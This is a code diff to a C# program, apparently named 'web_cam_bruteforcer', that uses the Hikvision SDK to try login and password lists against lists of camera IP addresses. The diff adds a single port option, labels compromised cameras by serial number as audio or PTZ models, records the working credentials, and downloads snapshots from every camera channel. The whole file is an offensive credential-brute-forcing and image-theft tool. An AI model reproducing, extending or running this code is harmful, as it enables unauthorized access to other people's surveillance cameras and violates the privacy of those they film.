@@ -8,6 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using HCNetSDK;
 using System.Drawing;
+using System.Text;
 using CommandLine;
 
 namespace web_cam_bruteforcer
@@ -15,12 +16,12 @@ namespace web_cam_bruteforcer
     class Program
     {
         public static string IpsFile = "data/IPs.txt";
-        public static string PortsFile = "data/ports.txt";
         public static string LoginFile = "data/logins.txt";
         public static string PasswordFile = "data/passwords.txt";
         public static string PicturesDir = "pictures";
         public static string OutputFile = "output.txt";
         public static bool FastMode;
+        public static int Port;
 
         static void Main(string[] args)
         {
@@ -28,6 +29,7 @@ namespace web_cam_bruteforcer
             if (Parser.Default.ParseArguments(args, options))
             {
                 FastMode = options.FastMode;
+                Port = options.Port;
             }
             CHCNetSDK.NET_DVR_Init();
             if (!FastMode)
@@ -44,7 +46,7 @@ namespace web_cam_bruteforcer
             if (!File.Exists(OutputFile))
                 File.Create(OutputFile).Dispose();
 
-            if (!File.Exists(IpsFile) || !File.Exists(PortsFile) || !File.Exists(LoginFile) || !File.Exists(PasswordFile))
+            if (!File.Exists(IpsFile) || !File.Exists(LoginFile) || !File.Exists(PasswordFile))
             {
                 Console.WriteLine("Failed to load data");
                 Console.ReadLine();
@@ -62,59 +64,36 @@ namespace web_cam_bruteforcer
                     Environment.Exit(0);
                 }
             }
-
-            foreach (string port in File.ReadAllLines(PortsFile))
-            {
-                int sp;
-                bool isInt = int.TryParse(port, out sp);
-                if (!isInt)
-                {
-                    Console.WriteLine("The port must be a number. Check file ports.txt!");
-                    Console.ReadLine();
-                    Environment.Exit(0);
-                }
-                if (sp < 0 || sp > 65535)
-                {
-                    Console.WriteLine("The range of ports should be from 0 to 65535. Check file ports.txt!");
-                    Console.ReadLine();
-                    Environment.Exit(0);
-                }
-            }
         }
 
         public static void Start()
         {
             string[] logins = File.ReadAllLines(LoginFile);
             string[] passwords = File.ReadAllLines(PasswordFile);
-            string[] ports = File.ReadAllLines(PortsFile);
 
             List<string> ips = File.ReadAllLines(IpsFile).ToList();
             List<Task> tasks = new List<Task>();
             foreach (string ip in ips)
             {
+                Console.ForegroundColor = ConsoleColor.DarkCyan;
+                Console.WriteLine("Used " + ip + ":" + Port);
+                Console.ResetColor();
                 tasks.Add(Task.Factory.StartNew(() =>
                 {
-                    foreach (string port in ports)
+                    foreach (string login in logins)
                     {
-                        int scanPort = int.Parse(port);
-                        foreach (string login in logins)
+                        foreach (string password in passwords)
                         {
-                            foreach (string password in passwords)
+                            if (!IsCamera(ip, Port))
                             {
-                                Console.ForegroundColor = ConsoleColor.DarkCyan;
-                                Console.WriteLine("Used " + ip + ":" + port);
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine(ip + ":" + Port + " is dead");
                                 Console.ResetColor();
-                                if (!IsCamera(ip, scanPort))
-                                {
-                                    Console.ForegroundColor = ConsoleColor.Red;
-                                    Console.WriteLine(ip + ":" + port + " is dead");
-                                    Console.ResetColor();
-                                    return;
-                                }
-                                if (BruteCam(ip, scanPort, login, password))
-                                {
-                                    return;
-                                }
+                                return;
+                            }
+                            if (BruteCam(ip, Port, login, password))
+                            {
+                                return;
                             }
                         }
                     }
@@ -134,13 +113,38 @@ namespace web_cam_bruteforcer
             int uid = CHCNetSDK.NET_DVR_Login_V30(ip, port, login, password, ref deviceInfo);
             if (uid != -1)
             {
+                var sn = Encoding.UTF8.GetString(deviceInfo.sSerialNumber).Replace("\0", "");
+
+                string features = "";
+
+                bool audio = IsAudio(sn);
+                bool ptz = IsPtz(sn);
+
+                if (audio)
+                    features = "Audio";
+                if (ptz)
+                    features = "PTZ";
+                if (!audio && !ptz)
+                    features = "not found";
+
                 Console.ForegroundColor = ConsoleColor.Green;
-                var sn = System.Text.Encoding.UTF8.GetString(deviceInfo.sSerialNumber);
-                Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port + ", channels: " + deviceInfo.byChanNum + ", SN: " + sn);
+                var channels = deviceInfo.byChanNum;
+                Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port + ", channels: " + channels + ", features: " + features + ", SerialNumber: " + sn);
                 Console.ResetColor();
                 if (!FastMode)
                 {
-                    File.AppendAllText(OutputFile, login + ":" + password + "@" + ip + ":" + port + "\n");
+                    if (!audio && !ptz)
+                    {
+                        AppendAllText(OutputFile, "Normal camera: " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber:" + sn + "\n");
+                    }
+                    if (audio)
+                    {
+                        AppendAllText(OutputFile, "Audio camera:  " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber:" + sn + "\n");
+                    }
+                    if (ptz)
+                    {
+                        AppendAllText(OutputFile, "PTZ camera:    " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber: " + sn + "\n");
+                    }
                     for (int channel = deviceInfo.byStartChan; channel < deviceInfo.byChanNum + deviceInfo.byStartChan; channel++)
                     {
                         string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" + channel + ".jpg";
@@ -154,6 +158,12 @@ namespace web_cam_bruteforcer
                             Image image = Image.FromFile(filename);
                             Console.ForegroundColor = ConsoleColor.Cyan;
                             Console.WriteLine("Downloaded picture (channel " + channel + ", size " + image.Width + "x" + image.Height + ") from the camera " + ip + ":" + port);
+                            Console.ResetColor();
+                        }
+                        else
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("Could not download picture from " + ip + ":" + port + " (channel " + channel + ")");
                             Console.ResetColor();
                         }
                     }
@@ -192,12 +202,48 @@ namespace web_cam_bruteforcer
                 }
             }
         }
+
+        public static bool IsAudio(string sn)
+        {
+            foreach (string audio in CamList.AudioCams)
+            {
+                if (sn.Contains(audio))
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        public static bool IsPtz(string sn)
+        {
+            foreach (string ptz in CamList.PtzCams)
+            {
+                if (sn.Contains(ptz))
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        public static void AppendAllText(string path, string line)
+        {
+            using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.Read))
+            using (StreamWriter streamWriter = new StreamWriter(fileStream, Encoding.UTF8))
+            {
+                streamWriter.Write(line);
+            }
+        }
     }
 
-    class Options
+    public class Options
     {
         [Option('f', "fast", DefaultValue = false)]
         public bool FastMode { get; set; }
+
+        [Option('p', "port", DefaultValue = 8000)]
+        public int Port { get; set; }
 
         [ParserState]
         public IParserState LastParserState { get; set; }
